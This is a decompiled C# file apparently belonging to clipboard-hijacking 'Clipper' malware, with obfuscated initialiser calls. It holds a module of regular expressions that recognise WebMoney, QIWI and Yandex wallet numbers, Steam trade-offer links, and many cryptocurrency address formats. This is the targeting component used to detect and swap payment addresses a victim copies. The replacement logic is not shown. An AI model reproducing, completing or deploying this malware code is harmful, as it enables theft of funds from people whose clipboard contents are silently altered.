using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper.Modules
{
	// Token: 0x0200000C RID: 12
	internal sealed class RegexPatterns
	{
		// Token: 0x0600001B RID: 27 RVA: 0x0000223C File Offset: 0x0000043C
		public RegexPatterns()
		{
			Class2.ecUkQ4xzjKxn7();
			base..ctor();
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000027DC File Offset: 0x000009DC
		// Note: this type is marked as 'beforefieldinit'.
		static RegexPatterns()
		{
			Class2.ecUkQ4xzjKxn7();
			RegexPatterns.patterns = new Dictionary<string, Regex>
			{
				{
					"wmr",
					new Regex("R[0-9]{12}")
				},
				{
					"wmg",
					new Regex("G[0-9]{12}")
				},
				{
					"wmz",
					new Regex("Z[0-9]{12}")
				},
				{
					"wmh",
					new Regex("H[0-9]{12}")
				},
				{
					"wmu",
					new Regex("U[0-9]{12}")
				},
				{
					"wmx",
					new Regex("X[0-9]{12}")
				},
				{
					"qiwiua",
					new Regex("380[0-9]{9}")
				},
				{
					"qiwiru",
					new Regex("79[0-9]{9}")
				},
				{
					"yandex",
					new Regex("41001[0-9]{10}")
				},
				{
					"steam",
					new Regex("steamcommunity[.]com/tradeoffer/new/[?]partner=[0-9]{9}&token=[A-z0-9_]{8}")
				},
				{
					"btc",
					new Regex("(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)")
				},
				{
					"eth",
					new Regex("(?:^0x[a-fA-F0-9]{40}$)")
				},
				{
					"xmr",
					new Regex("(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)")
				},
				{
					"xlm",
					new Regex("(?:^G[0-9a-zA-Z]{55}$)")
				},
				{
					"xrp",
					new Regex("(?:^r[0-9a-zA-Z]{24,34}$)")
				},
				{
					"ltc",
					new Regex("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)")
				},
				{
					"nec",
					new Regex("(?:^A[0-9a-zA-Z]{33}$)")
				},
				{
					"bch",
					new Regex("^((bitcoincash:)?(q|p)[a-z0-9]{41})")
				},
				{
					"bcn",
					new Regex("2[1-9A-z]{105}")
				},
				{
					"ada",
					new Regex("DdzFFzCqrht[1-9A-z]{93}")
				},
				{
					"grft",
					new Regex("G[1-9][1-9A-z]{93}")
				},
				{
					"zcash",
					new Regex("t1[0-9A-z]{33}")
				},
				{
					"btg",
					new Regex("G[A-z][1-9A-z]{32}")
				},
				{
					"waves",
					new Regex("3P[1-9A-z]{33}")
				},
				{
					"rdd",
					new Regex("R[1-9a-z][1-9A-z]{32}")
				},
				{
					"blk",
					new Regex("B[1-9a-z][1-9A-z]{32}")
				},
				{
					"emc",
					new Regex("E[A-z][1-9A-z]{32}")
				},
				{
					"strat",
					new Regex("S[A-z][1-9A-z]{32}")
				},
				{
					"qtum",
					new Regex("Q[A-z][1-9A-z]{32}")
				},
				{
					"via",
					new Regex("V[a-z][A-z][1-9A-z]{31}")
				},
				{
					"lsk",
					new Regex("[0-9]{20}L")
				},
				{
					"doge",
					new Regex("D[A-Z1-9][1-9A-z]{32}")
				},
				{
					"dash",
					new Regex("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)")
				}
			};
		}

		// Token: 0x0400000F RID: 15
		public static Dictionary<string, Regex> patterns;
	}
}
